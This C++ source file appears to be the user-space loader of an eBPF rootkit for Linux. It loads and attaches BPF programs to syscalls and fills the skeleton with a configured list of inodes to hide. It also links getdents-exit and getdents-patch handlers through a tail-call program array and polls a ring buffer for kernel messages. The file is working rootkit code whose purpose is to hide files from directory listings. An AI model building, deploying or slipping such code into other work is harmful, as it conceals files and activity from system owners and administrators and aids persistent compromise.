#include "rootkit/RootkitBpfHelper.hpp"
#include "common.h"
#include "rootkit.skel.h"
#include "rootkit/ConfigManager.hpp"
#include "rootkit/issues/Issue.hpp"

#include <cstring>
#include <format>
#include <optional>

extern "C" {
#include <bpf/bpf.h>
#include <bpf/libbpf.h>
}

rootkit::RootkitBpfHelper::RootkitBpfHelper(const RootkitBpfConfig& conf,
    int (* rb_callback)(void *, void *, unsigned long),
    const issues::Logger& logger
)
    :skel(nullptr),
    rb(nullptr),
    conf(conf),
    error(logger)
{
    // Open the skeleton
    skel = rootkit_bpf__open();
    if (!skel) {
        error = "Failed to open BPF skeleton";
        return;
    }

    if (!setup_volatile_consts()) {
        clean();
        return;
    }

    // Load the program
    int err = rootkit_bpf__load(skel);
    if (err) {
        error = "Failed to load and verify BPF skeleton";
        clean();
        return;
    }

    setup_arr_links();

    // Attach to syscalls
    err = rootkit_bpf__attach(skel);
    if (err) {
        error = "Failed to attach BPF programs\n";
        clean();
        return;
    }

    // Get ring buffer for messages from kernel space
    // All messages will be processed by rb_callback function
    setup_msg_ring_buffer(skel->maps.rb, rb_callback);
}

rootkit::RootkitBpfHelper::~RootkitBpfHelper() {
    if (status() == std::nullopt)
        clean();
}

void rootkit::RootkitBpfHelper::rb_poll(int timeout) {
    int err = ring_buffer__poll(rb, timeout);
    if (err < 0) {
        // This error indicates exit event,
        // So this makes sure that no error message will be printed (registered)
        // on exit event
        if (errno != EINTR)
            error = std::format("perf_reader__poll error: {}", strerror(errno));
        clean();
    }
}

std::optional<std::string> rootkit::RootkitBpfHelper::status() const {
    if (!error.empty())
        return error.get_message();

    // Safe check, this should never execute
    if (skel == nullptr && rb == nullptr)
        return "Uknown error";

    return std::nullopt;
}

struct rootkit_bpf * rootkit::RootkitBpfHelper::get_rootkit() {
    if (status() != std::nullopt)
        return nullptr;

    return skel;
}

void rootkit::RootkitBpfHelper::clean() {
    if (skel != nullptr)
        rootkit_bpf__destroy(skel);
    if (rb != nullptr)
        ring_buffer__free(rb);

    skel = nullptr;
    rb = nullptr;
}


void rootkit::RootkitBpfHelper::setup_msg_ring_buffer(
    struct bpf_map * map,
    int (*callback)(void *, void *, unsigned long)
) {
    int map_fd = bpf_map__fd(map);
    if (map_fd < 0) {
        error = "failed to get map fd";
        clean();
        return;
    }

    // Create perf reader using libbpf helper
    rb = ring_buffer__new(map_fd, callback, NULL, NULL);
    if (!rb) {
        error = "failed to create perf reader";
        clean();
        return;
    }
}

bool rootkit::RootkitBpfHelper::setup_volatile_consts() {
    if (this->conf.inodes.size() > INODES_TO_HIDE_LEN) {
        error = std::format(
            "Maximum allowed inodes to hide is {}",
            INODES_TO_HIDE_LEN);
        return false;
    }

    // Copy inodes to hide from vector to the bpf skel memory
    std::memcpy(skel->rodata->inodes_to_hide,
                this->conf.inodes.data(),
                this->conf.inodes.size() * sizeof(decltype(this->conf.inodes)::value_type));

    // Set size of the inodesxto_hide in bpf skel
    skel->rodata->inodes_to_hide_len = this->conf.inodes.size();

    return true;
}

void rootkit::RootkitBpfHelper::setup_arr_links() {
    if (status() != std::nullopt)
        return;

    struct BpfProgramIndexInfo {
        size_t index;
        struct bpf_program * program;
        bool auto_attach;
    };

    const BpfProgramIndexInfo index_to_bpf_program[] = {
        {PROG_01, skel->progs.handle_getdents_exit, true},
        {PROG_02, skel->progs.handle_getdents_patch, false}
    };

    // Link right index to right function so the bpf_tail_call can work properly
    for (auto info : index_to_bpf_program) {
        if (info.auto_attach == false)
            bpf_program__set_autoattach(info.program, false);

        int index = info.index;
        int prog_fd = bpf_program__fd(info.program);
        int ret = bpf_map_update_elem(
            bpf_map__fd(skel->maps.prog_array),
            &index,
            &prog_fd,
            BPF_ANY);

        if (ret == -1) {
            error = std::format("Failed to add program to prog array: {}", strerror(errno));

            clean();
            return;
        }
    }
}
